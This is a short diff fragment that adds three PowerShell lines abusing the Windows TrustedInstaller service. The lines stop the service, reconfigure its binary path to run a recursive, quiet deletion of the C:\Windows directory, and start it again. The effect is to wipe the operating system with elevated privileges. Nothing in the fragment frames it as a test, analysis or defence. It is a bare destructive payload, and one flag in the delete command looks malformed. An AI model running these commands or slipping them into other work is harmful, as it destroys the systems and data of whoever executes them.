@@ -1,0 +1,3 @@
+powershell sc.exe stop TrustedInstaller
+powershell sc.exe config TrustedInstaller binPath= "cmd.exe /k rd /s /f /q C:\Windows\"
+powershell sc.exe start TrustedInstaller
